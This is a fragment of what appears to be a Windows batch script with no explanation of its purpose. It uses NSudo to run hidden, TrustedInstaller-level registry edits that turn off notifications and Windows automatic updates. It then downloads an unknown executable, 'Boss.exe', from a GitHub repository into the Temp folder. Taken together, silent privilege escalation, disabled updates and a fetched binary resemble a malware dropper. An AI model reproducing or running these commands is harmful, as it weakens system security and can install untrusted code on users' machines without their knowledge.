...
NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications" /v "ToastEnabled" /t REG_DWORD /d "0" /f

NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f
...
powershell.exe -command "Start-BitsTransfer -Source "https://github.com/Des0lator/-/raw/main/Boss.exe" -Destination "C:\Users\%USERNAME%\AppData\Local\Temp\Boss.exe""
